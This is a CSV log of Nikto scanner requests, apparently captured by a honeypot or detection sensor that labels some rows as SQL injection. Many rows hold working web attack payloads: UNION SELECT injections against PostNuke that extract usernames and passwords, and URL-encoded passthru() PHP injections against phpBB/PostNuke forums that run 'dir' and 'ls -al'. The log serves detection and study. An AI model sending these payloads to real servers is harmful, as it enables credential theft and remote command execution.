timestamp,method,path,status,ip,port,uuid,sess_uuid,detection_name,detection_type,user_agent,referer
2025-05-20T07:31:09.448666,PUT,/nikto-test-hRIkkuBU.html,200,172.18.0.1,37182,6fd7ef35-b057-461d-aaec-677f18cc692b,1002d751-dc04-41c2-b6f9-38fd2993f06d,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:put_del_test: PUT),
2025-05-20T07:31:09.460091,OPTIONS,/,200,172.18.0.1,37182,6fd7ef35-b057-461d-aaec-677f18cc692b,38becd86-e319-44e8-a02b-0f4e3baf75c1,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: OPTIONS /),
2025-05-20T07:31:09.469366,PROPFIND,/,200,172.18.0.1,37188,6fd7ef35-b057-461d-aaec-677f18cc692b,011dcd89-1b4c-465d-87e1-c78ce5678d99,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: PROPFIND),
2025-05-20T07:31:09.479298,TRACE,/,200,172.18.0.1,37188,6fd7ef35-b057-461d-aaec-677f18cc692b,e79cef69-7566-4098-98b9-558912499e7f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACE),
2025-05-20T07:31:09.488208,TRACE,/,200,172.18.0.1,37188,6fd7ef35-b057-461d-aaec-677f18cc692b,e79cef69-7566-4098-98b9-558912499e7f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACE),
2025-05-20T07:31:09.499294,GET,/cfappman/index.cfm,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,4aeb1ed5-f108-4ad8-ba77-c9c9434b59e8,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000013),
2025-05-20T07:31:09.504380,GET,/cfdocs/examples/cvbeans/beaninfo.cfm,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,425aa79e-ede7-46a7-b65f-2c816dfa79a4,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000014),
2025-05-20T07:31:09.508944,GET,/cfdocs/examples/parks/detail.cfm,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,141ecf0d-8203-4610-bb49-6f711407567d,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000015),
2025-05-20T07:31:09.513073,GET,/kboard/,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,3d60554e-c779-4182-a090-b00728ca4014,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000016),
2025-05-20T07:31:09.517219,GET,/lists/admin/,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,1c302bfc-ce0b-448c-b7cf-ee4d3dec8d32,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000017),
2025-05-20T07:31:09.522561,GET,/splashAdmin.php,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,ea3d008f-38a1-4573-964e-99c82ffc4757,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000018),
2025-05-20T07:31:09.527860,GET,/ssdefs/,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,807af7d9-2b34-4ab8-bc45-ea5ffabba818,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000019),
2025-05-20T07:31:09.532171,GET,/sshome/,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,3420a23d-e091-4ea5-bf52-25626e078121,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000020),
2025-05-20T07:31:09.536935,GET,/tiki/,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,3a05483d-0865-453b-a13a-1437d85f690e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000021),
2025-05-20T07:31:09.541031,GET,/tiki/tiki-install.php,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,6e9a7063-06d4-4fab-ad0f-8fe7e7235a08,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000022),
2025-05-20T07:31:09.544994,GET,/scripts/samples/details.idc,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,de5e9b58-8038-4eb5-aec0-04d387973a06,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000023),
2025-05-20T07:31:09.549316,GET,/geeklog/users.php,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,be5f52a9-e6b5-48ad-8d8d-c736cf5f4982,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000073),
2025-05-20T07:31:09.554093,GET,/admentor/adminadmin.asp,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,0fd0b7e3-4df8-48da-9a7b-0a7866a34fc4,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000683),
2025-05-20T07:31:09.559691,GET,/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,56a39238-298d-40b5-af3b-a55a0508097d,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000686),
2025-05-20T07:31:09.565152,GET,/userinfo.php?uid=1;,200,172.18.0.1,37210,6fd7ef35-b057-461d-aaec-677f18cc692b,85376f48-2ef0-41d1-b4f8-fa854de77f40,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000687),
2025-05-20T07:31:09.614146,GET,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*",200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,cbd3a539-d14a-4f53-8e96-2e3a4c02fac2,sqli,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690),
2025-05-20T07:31:09.623502,GET,"/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*",200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,4885369f-2978-4d58-9120-213d6de3f226,sqli,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691),
2025-05-20T07:31:09.632564,GET,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,c19d4732-ae92-4f6f-8596-efe4a80f8752,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000693),
2025-05-20T07:31:09.637476,GET,/phpBB2/search.php?search_id=1\\,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,415fc45b-b701-4658-842e-77a4b146c597,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000694),
2025-05-20T07:31:09.642865,GET,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*",200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,eaaf822b-64a3-401f-9389-1017eaeadbc6,sqli,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695),
2025-05-20T07:31:09.651295,GET,/author.asp,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,d15f590c-66cf-4607-98ec-89131c35837b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000696),
2025-05-20T07:31:09.655632,GET,/agentadmin.php,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,322947e5-0963-451e-aa1b-90a441b8f06a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001110),
2025-05-20T07:31:09.660915,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,4b9026cc-a942-41ef-8a57-36f77d84626f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001388),
2025-05-20T07:31:09.665994,GET,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,01cd6d95-c79e-44fe-9157-609f3b321cde,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001389),
2025-05-20T07:31:09.673265,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.678600,GET,/postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.683821,GET,/postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.688979,GET,/modules/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.694042,GET,/phpBB/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.698960,GET,/forum/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.704877,GET,/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.709914,GET,/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.714762,GET,/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.719897,GET,/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.726644,GET,/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.731476,GET,/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:31:09.737178,GET,/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.742134,GET,/postnuke/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.747000,GET,/postnuke/html/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.753122,GET,/modules/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.759659,GET,/phpBB/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.766148,GET,/forum/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.771744,GET,/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.777142,GET,/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.783717,GET,/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.788742,GET,/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.793723,GET,/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.799788,GET,/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:31:09.805052,GET,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.809892,GET,/postnuke/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.815408,GET,/postnuke/html/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.820726,GET,/modules/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.825688,GET,/phpBB/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.831398,GET,/forum/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:31:09.838102,GET,/index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,e2adedd7-d0f8-44e4-be25-dfa37180ec54,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001393),
2025-05-20T07:31:09.843700,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,fa8e7bc3-c6e0-4049-9ab2-c07b17e68df5,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001394),
2025-05-20T07:31:09.849959,GET,/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,34419ee6-4a45-4784-a5cb-a4fdea5acb19,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001395),
2025-05-20T07:31:09.854758,GET,/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,b3a3fd46-2c1f-4367-b7f4-179bda0316cd,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001396),
2025-05-20T07:31:09.859859,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:31:09.864918,GET,/postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:31:09.869802,GET,/postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:31:09.874880,GET,/modules/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,37220,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
